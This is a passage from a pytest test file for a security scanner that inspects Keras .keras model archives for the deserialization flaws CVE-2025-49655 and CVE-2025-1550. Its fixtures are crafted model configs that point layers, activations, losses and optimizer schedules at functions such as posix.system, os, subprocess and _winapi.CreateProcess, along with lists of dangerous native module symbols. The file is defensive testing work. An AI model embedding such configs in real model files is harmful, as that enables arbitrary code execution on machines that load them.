    def test_builtin_registered_name_with_mixed_module_refs_is_flagged(self, tmp_path: Path) -> None:
        """A safe module reference must not suppress a separate unsafe one."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "spoofed_add",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "Add",
                        "config": {"fn_module": "evil.module"},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="mixed_builtin_registered.keras"))
        )

        custom_object_checks = [check for check in result.checks if check.name == "Custom Object Detection"]
        assert len(custom_object_checks) == 1
        assert custom_object_checks[0].details["registered_name"] == "Add"

    def test_builtin_class_with_non_allowlisted_module_and_no_registered_name_is_flagged(self, tmp_path: Path) -> None:
        """Built-in class names must still be flagged when module metadata points outside the allowlist."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "spoofed_add",
                        "module": "evil.module",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="builtin_class_evil_module.keras"))
        )

        assert any(check.name == "Custom Layer Class Detection" for check in result.checks)
        assert any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_allowlisted_module_layer_does_not_false_positive(self, tmp_path: Path) -> None:
        """Layers from allowlisted Keras modules should not be treated as custom objects."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "NotEqual",
                        "name": "not_equal",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "NotEqual",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="allowlisted_module.keras")))

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Object Detection" for check in result.checks)

    def test_allowlisted_registered_object_without_module_does_not_false_positive_custom_object(
        self, tmp_path: Path
    ) -> None:
        """Allowlisted registered objects should not need module metadata to suppress custom-object warnings."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "NotEqual",
                        "name": "not_equal",
                        "registered_name": "NotEqual",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="allowlisted_registered_without_module.keras"))
        )

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Object Detection" for check in result.checks)

    def test_allowlisted_module_does_not_suppress_unknown_custom_layer(self, tmp_path: Path) -> None:
        """Unknown classes must still be flagged even if module metadata looks Keras-owned."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "EvilLayer",
                        "name": "evil_layer",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "EvilLayer",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="evil_allowlisted.keras")))

        assert any(check.name == "Custom Layer Class Detection" for check in result.checks)
        assert any(check.name == "Custom Object Detection" for check in result.checks)

    def test_generic_base_layer_class_still_flags_custom_layer(self, tmp_path: Path) -> None:
        """The abstract Keras base Layer export should not suppress custom-layer review."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Layer",
                        "name": "generic_layer",
                        "module": "keras.layers",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="generic_layer.keras")))

        assert any(check.name == "Custom Layer Class Detection" for check in result.checks)


class TestCVE202549655TorchModuleWrapper:
    """Test CVE-2025-49655: TorchModuleWrapper deserialization RCE detection."""

    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with the given config.json."""
        return _build_test_keras_zip(config, tmp_path, "3.11.0")

    def _make_keras_zip_with_version(self, config: dict[str, Any], tmp_path: Path, keras_version: str) -> str:
        return _build_test_keras_zip(config, tmp_path, keras_version)

    def test_torch_module_wrapper_detected_critical(self, tmp_path: Path) -> None:
        """TorchModuleWrapper layer should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "TorchModuleWrapper",
                        "name": "torch_wrapper_1",
                        "config": {"module": "my_torch_module"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1, "Should detect TorchModuleWrapper as CVE-2025-49655"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_torch_module_wrapper_attribution_details(self, tmp_path: Path) -> None:
        """CVE attribution details should be present."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "TorchModuleWrapper",
                        "name": "wrapper",
                        "config": {},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-49655"
        assert details["cvss"] == 9.8
        assert details["cwe"] == "CWE-502"
        assert details["description"]
        assert "3.11.3" in details["remediation"]

    def test_no_false_positive_dense_layer(self, tmp_path: Path) -> None:
        """Dense layers should NOT trigger CVE-2025-49655."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) == 0, "Dense layer should not trigger CVE-2025-49655"

    def test_nested_torch_module_wrapper(self, tmp_path: Path) -> None:
        """TorchModuleWrapper in nested model should still be detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Model",
                        "name": "submodel",
                        "config": {
                            "layers": [
                                {
                                    "class_name": "TorchModuleWrapper",
                                    "name": "nested_wrapper",
                                    "config": {},
                                }
                            ]
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1, "Should detect TorchModuleWrapper in nested model"

    @pytest.mark.parametrize(
        "keras_version",
        [
            "3.11a0",
            "3.11rc1",
            "3.11.dev0",
            "3.11.0a0",
            "3.11.0rc1",
            "3.11.0.dev999",
            "3.11.0.0rc1",
            "3.11.3",
            "3.11.3+local",
            "3.11.3.post1",
            "3.11.3.post1.dev0",
            "3.11.3-post1.dev0",
            "3.11.3-1.dev0",
            "3.11.3_post1.dev0",
            "3.11.3-r1.dev0",
            "3.11.3rev1.dev0",
            "3.11.4.dev0",
        ],
    )
    def test_no_cve_outside_affected_keras_range(self, tmp_path: Path, keras_version: str) -> None:
        """Keras builds outside >= 3.11.0 and < 3.11.3 should not be CVE-attributed."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "TorchModuleWrapper",
                        "name": "torch_wrapper_1",
                        "config": {"module": "my_torch_module"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, keras_version))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) == 0, "Versions outside the affected range should not get CVE attribution"
        risk_checks = [c for c in result.checks if c.name == "TorchModuleWrapper Version Risk Check"]
        assert len(risk_checks) >= 1
        assert risk_checks[0].severity == IssueSeverity.WARNING

    def test_two_part_version_is_treated_as_vulnerable(self, tmp_path: Path) -> None:
        """Keras 3.11 should be interpreted as vulnerable (patch=0)."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }
        result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, "3.11"))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_prerelease_versions_treated_as_vulnerable(self, tmp_path: Path) -> None:
        """PEP 440 prerelease/dev versions in vulnerable 3.11.x range should be flagged."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }

        for prerelease_version in ["3.11.1rc1", "3.11.2.dev0"]:
            result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, prerelease_version))
            cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
            assert len(cve_issues) >= 1, f"Prerelease {prerelease_version} should be treated as vulnerable"
            assert cve_issues[0].severity == IssueSeverity.CRITICAL

    @pytest.mark.parametrize(
        "keras_version",
        [
            "3.11.3a0",
            "3.11.3-alpha.1",
            "3.11.3b1",
            "3.11.3c1",
            "3.11.3rc1",
            "3.11.3rc1.post1.dev0+local",
            "3.11.3.dev0",
            "3.11.3_dev0",
        ],
    )
    def test_fixed_boundary_prerelease_versions_treated_as_vulnerable(
        self,
        tmp_path: Path,
        keras_version: str,
    ) -> None:
        """Prereleases of the fixed boundary sort before final 3.11.3 and remain vulnerable."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }

        result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, keras_version))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert cve_issues
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["keras_version"] == keras_version
        assert cve_issues[0].details["affected_versions"] == "Keras >= 3.11.0 and < 3.11.3"
        assert cve_issues[0].why is not None
        assert "Keras >= 3.11.0 and < 3.11.3" in cve_issues[0].why

    @pytest.mark.parametrize(
        ("keras_version", "expected_critical"),
        [
            ("3.11.2+" + ("a" * 256), True),
            ("3.11.3+" + ("a" * 256), False),
        ],
    )
    def test_long_local_version_classified_before_evidence_truncation(
        self,
        tmp_path: Path,
        keras_version: str,
        expected_critical: bool,
    ) -> None:
        """Long valid local labels must not change public-version CVE attribution."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }

        result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, keras_version))

        assert result.metadata["keras_version"].endswith("...")
        cve_issues = [
            issue
            for issue in result.issues
            if issue.details.get("cve_id") == "CVE-2025-49655" and issue.severity == IssueSeverity.CRITICAL
        ]
        assert bool(cve_issues) is expected_critical
        if not expected_critical:
            risk_checks = [check for check in result.checks if check.name == "TorchModuleWrapper Version Risk Check"]
            assert len(risk_checks) == 1
            assert risk_checks[0].details["parse_status"] == "metadata_non_vulnerable"

    @pytest.mark.parametrize(
        ("keras_version", "expected"),
        [
            ("3", False),
            ("4rc1", False),
            ("3.11a0", False),
            ("3.11rc1", False),
            ("3.11.dev0", False),
            ("3.11.0a0", False),
            ("3.11.0rc1", False),
            ("3.11.0.dev999", False),
            ("3.11.0.0rc1", False),
            ("3.11", True),
            ("3.11.0", True),
            ("3.11.0+local", True),
            ("3.11.0.post1", True),
            ("3.11.0.post1.dev0", True),
            ("3.11.3rc1", True),
            ("3.11.3c1", True),
            ("3.11.3.dev0", True),
            ("3.11.3_dev0", True),
            ("3.11.3rc1.post1", True),
            ("3.11.3rc1.post1.dev0+local", True),
            ("v3.11.3rc1", True),
            ("V3.11.3.dev0", True),
            ("0!3.11.3rc1", True),
            ("3.11.3.0rc1", True),
            ("3.11.3.0.dev0", True),
            ("3.11.3.post1.dev0", False),
            ("3.11.3-post1.dev0", False),
            ("3.11.3-1.dev0", False),
            ("3.11.3_post1.dev0", False),
            ("3.11.3-r1.dev0", False),
            ("3.11.3rev1.dev0", False),
            ("v3.11.3", False),
            ("1!3.11.0", False),
            ("3.11.3.0", False),
            ("3.11.3.1.dev0", False),
            ("3.11.3+rc1", False),
            ("3.11.3.0rcpu", None),
            ("3.11.3rcpu", None),
            ("3.11.3devops", None),
            ("3.11.3alphafoo", None),
            ("3.11.3previewbuild", None),
            ("3.11.\u0663rc1", None),
            ("3.11.3rc\u0661", None),
        ],
    )
    def test_version_parser_requires_bounded_prerelease_qualifiers(
        self,
        keras_version: str,
        expected: bool | None,
    ) -> None:
        """Malformed qualifier lookalikes should not receive critical CVE attribution."""
        assert KerasZipScanner._is_vulnerable_keras_3_11_x(keras_version) is expected

    @pytest.mark.parametrize("keras_version", ["3.11.3rcpu", "3.11.\u0663rc1", "3.11.3rc\u0661"])
    def test_malformed_boundary_qualifier_is_warning_only(self, tmp_path: Path, keras_version: str) -> None:
        """Malformed prerelease lookalikes must not receive critical CVE attribution."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }

        result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, keras_version))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-49655"]
        assert cve_issues
        assert all(issue.severity == IssueSeverity.WARNING for issue in cve_issues)
        unknown_checks = [check for check in result.checks if check.name == "TorchModuleWrapper Risk (Version Unknown)"]
        assert len(unknown_checks) == 1
        assert unknown_checks[0].details["parse_status"] == "unknown"
        assert result.success is True

    def test_torch_module_wrapper_version_unknown(self, tmp_path: Path) -> None:
        """Missing or non-canonical version should emit warning, not pass."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }
        keras_path = tmp_path / "unknown_version.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({}))  # No keras_version

        result = scanner.scan(str(keras_path))
        warning_checks = [c for c in result.checks if "Version Unknown" in c.name]
        assert len(warning_checks) >= 1
        assert warning_checks[0].severity == IssueSeverity.WARNING


class TestCVE20251550ModuleReferences:
    """Test CVE-2025-1550: Keras safe_mode bypass via arbitrary module references in config.json."""

    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with the given config.json."""
        return _build_test_keras_zip(config, tmp_path, "3.0.0")

    def test_dangerous_module_os_in_layer(self, tmp_path: Path) -> None:
        """A layer referencing 'os' module should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "os",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should detect dangerous 'os' module reference"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_dangerous_module_subprocess_in_fn_module(self, tmp_path: Path) -> None:
        """A layer with fn_module='subprocess' should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 10, "fn_module": "subprocess"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should detect dangerous 'subprocess' fn_module reference"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_dangerous_module_builtins_dotpath(self, tmp_path: Path) -> None:
        """A layer referencing 'builtins.eval' should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "evil_dense",
                        "module": "builtins",
                        "config": {"units": 1},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert "builtins" in cve_issues[0].message

    @pytest.mark.parametrize(
        ("module_value", "symbol"),
        [
            ("posix", "system"),
            ("posix", "execve"),
            ("nt", "spawnv"),
            ("_ctypes", "dlopen"),
            ("_frozen_importlib", "_find_and_load"),
            ("_imp", "load_dynamic"),
            ("_interpreters", "exec"),
            ("_io", "open"),
            ("io", "open"),
            ("_operator", "attrgetter"),
            ("operator", "attrgetter"),
            ("_pickle", "loads"),
            ("_posixsubprocess", "fork_exec"),
            ("_socket", "socket"),
            ("_thread", "start_new_thread"),
            ("_winapi", "CreateProcess"),
            ("_xxsubinterpreters", "run_string"),
        ],
    )
    def test_native_dangerous_module_symbols_are_critical(
        self,
        tmp_path: Path,
        module_value: str,
        symbol: str,
    ) -> None:
        """Known executable native symbols should be treated like their public aliases."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "function",
                        "name": "native_evil",
                        "module": module_value,
                        "config": symbol,
                        "registered_name": symbol,
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [
            issue
            for issue in result.issues
            if issue.details.get("cve_id") == "CVE-2025-1550" and issue.details.get("module") == module_value
        ]
        assert cve_issues
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    @pytest.mark.parametrize(
        "module_value",
        [
            "posix",
            "nt",
            "_ctypes",
            "_frozen_importlib",
            "_frozen_importlib_external",
            "_imp",
            "_interpreters",
            "_io",
            "_multiprocessing",
            "_pickle",
            "_posixsubprocess",
            "_signal",
            "_socket",
            "_thread",
            "_winapi",
            "_xxsubinterpreters",
        ],
    )
    def test_native_module_with_unresolved_layer_symbol_is_not_critical(
        self,
        tmp_path: Path,
        module_value: str,
    ) -> None:
        """Importable modules do not execute when the requested layer symbol does not exist."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "unresolved_native_layer",
                        "module": module_value,
                        "config": {"units": 1},
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert all(issue.severity != IssueSeverity.CRITICAL for issue in cve_issues)

    @pytest.mark.parametrize(
        "module_value",
        [
            "posix.path",
            "nt.path",
            "_ctypes.child",
            "_frozen_importlib.child",
            "_frozen_importlib_external.child",
            "_imp.child",
            "_interpreters.child",
            "_io.child",
            "_multiprocessing.child",
            "_pickle.child",
            "_posixsubprocess.child",
            "_signal.child",
            "_socket.child",
            "_thread.child",
            "_winapi.child",
            "_xxsubinterpreters.child",
        ],
    )
    def test_native_extension_dotted_children_are_not_critical(
        self,
        tmp_path: Path,
        module_value: str,
    ) -> None:
        """Native extension modules are not packages with importable dotted children."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "native_child",
                        "config": {"fn_module": module_value},
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert cve_issues
        assert all(issue.severity != IssueSeverity.CRITICAL for issue in cve_issues)

    def test_native_function_with_string_config_is_critical(self, tmp_path: Path) -> None:
        """Canonical serialized functions must be checked even though their config is a string."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "function",
                        "name": "native_function",
                        "module": "posix",
                        "config": "system",
                        "registered_name": "system",
                        "inbound_nodes": [],
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert cve_issues
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["module"] == "posix"

    def test_root_serialized_native_function_is_critical(self, tmp_path: Path) -> None:
        """A serialized callable at the config root must not bypass layer-focused traversal."""
        scanner = KerasZipScanner()
        config = {
            "module": "posix",
            "class_name": "function",
            "config": "system",
            "registered_name": "system",
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert cve_issues
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["module"] == "posix"
        assert cve_issues[0].details["layer_name"] == "model_config"

    def test_root_config_module_metadata_is_not_flagged(self, tmp_path: Path) -> None:
        """Only the root serialized object, not arbitrary model config metadata, is executable."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "module": "keras",
            "config": {"module": "posix", "layers": []},
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert not cve_issues

    def test_nested_serialized_native_function_is_critical(self, tmp_path: Path) -> None:
        """Nested activations use serialized function dicts that must not bypass module checks."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_with_native_activation",
                        "module": "keras.layers",
                        "config": {
                            "units": 1,
                            "activation": {
                                "module": "posix",
                                "class_name": "function",
                                "config": "system",
                                "registered_name": "system",
                            },
                        },
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert cve_issues
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["module"] == "posix"

    def test_inbound_node_serialized_native_function_is_critical(self, tmp_path: Path) -> None:
        """Functional node args and kwargs are deserialized before invoking a layer."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_with_native_arg",
                        "module": "keras.layers",
                        "config": {"units": 1},
                        "inbound_nodes": [
                            {
                                "args": [
                                    {
                                        "module": "posix",
                                        "class_name": "function",
                                        "config": "system",
                                        "registered_name": "system",
                                    }
                                ],
                                "kwargs": {},
                            }
                        ],
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert cve_issues
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["module"] == "posix"

    def test_inbound_node_module_metadata_is_not_flagged(self, tmp_path: Path) -> None:
        """Plain inbound-node metadata with a module key is not a serialized callable."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_with_metadata_arg",
                        "module": "keras.layers",
                        "config": {"units": 1},
                        "inbound_nodes": [{"args": [{"module": "posix", "note": "metadata"}], "kwargs": {}}],
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert not cve_issues

    def test_flax_layer_serialized_module_function_is_critical(self, tmp_path: Path) -> None:
        """FlaxLayer deserializes its dict-valued module config before model use."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "FlaxLayer",
                        "name": "flax_native_module",
                        "module": "keras.layers",
                        "config": {
                            "module": {
                                "module": "posix",
                                "class_name": "function",
                                "config": "system",
                                "registered_name": "system",
                            }
                        },
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert cve_issues
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["module"] == "posix"

    def test_feature_space_nested_preprocessor_function_is_critical(self, tmp_path: Path) -> None:
        """Unregistered Feature wrappers must not hide their deserialized preprocessors."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "FeatureSpace",
                        "name": "features",
                        "module": "keras.utils",
                        "config": {
                            "features": {
                                "x": {
                                    "module": "keras.src.layers.preprocessing.feature_space",
                                    "class_name": "Feature",
                                    "config": {
                                        "dtype": "float32",
                                        "output_mode": "float",
                                        "preprocessor": {
                                            "module": "posix",
                                            "class_name": "function",
                                            "config": "system",
                                        },
                                    },
                                }
                            }
                        },
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert cve_issues
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["module"] == "posix"
        assert cve_issues[0].details["layer_name"] == "features"

    def test_compile_config_serialized_native_function_is_critical(self, tmp_path: Path) -> None:
        """Compile-time losses and metrics are deserialized and require the same module checks."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense",
                        "module": "keras.layers",
                        "config": {"units": 1},
                    }
                ]
            },
            "compile_config": {
                "loss": {
                    "module": "posix",
                    "class_name": "function",
                    "config": "system",
                },
                "metrics": {
                    "output": [
                        {
                            "module": "nt",
                            "class_name": "function",
                            "config": "system",
                        }
                    ]
                },
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert {issue.details["module"] for issue in cve_issues} == {"nt", "posix"}
        assert all(issue.severity == IssueSeverity.CRITICAL for issue in cve_issues)
        assert {issue.details["layer_name"] for issue in cve_issues} == {
            "compile_config.loss",
            "compile_config.metrics",
        }

    def test_optimizer_learning_rate_native_schedule_is_critical(self, tmp_path: Path) -> None:
        """Optimizer schedule objects are deserialized below the optimizer config boundary."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": []},
            "compile_config": {
                "optimizer": {
                    "module": "keras.optimizers",
                    "class_name": "Adam",
                    "config": {
                        "learning_rate": {
                            "module": "os",
                            "class_name": "system",
                            "config": {},
                        }
                    },
                }
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert cve_issues
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["module"] == "os"
        assert cve_issues[0].details["layer_name"] == "compile_config.optimizer"

    def test_nested_non_object_module_metadata_is_not_flagged(self, tmp_path: Path) -> None:
        """Arbitrary metadata dictionaries should not be treated as serialized Keras objects."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "metadata_only",
                        "module": "keras.layers",
                        "config": {
                            "units": 1,
                            "metadata": {
                                "class_name": "Report",
                                "module": "posix",
                                "config": {"summary": "Runtime compatibility report"},
                            },
                        },
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert not cve_issues

    @pytest.mark.parametrize(
        "layer",
        [
            {"class_name": "Report", "name": "missing_config", "module": "posix"},
            {"name": "missing_class", "module": "posix", "config": {}},
            {"class_name": None, "name": "invalid_class", "module": "posix", "config": {}},
        ],
    )
    def test_non_serialized_layer_shapes_are_not_flagged(
        self,
        tmp_path: Path,
        layer: dict[str, Any],
    ) -> None:
        """Malformed layer metadata that Keras does not deserialize must not be promoted to critical."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [layer]},
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert not cve_issues

    @pytest.mark.parametrize(
        "module_value",
        [
            "posixpath",
            "ntpath",
            "_ctypes_test",
            "_frozen_importlib_helper",
            "_frozen_importlib_external_helper",
            "_imp_helper",
            "_interpreters_helper",
            "_io_helper",
            "_multiprocessing_helper",
            "_pickletools",
            "_posixsubprocess_helper",
            "_signal_helper",
            "_socketio",
            "_threading",
            "_winapi_helper",
        ],
    )
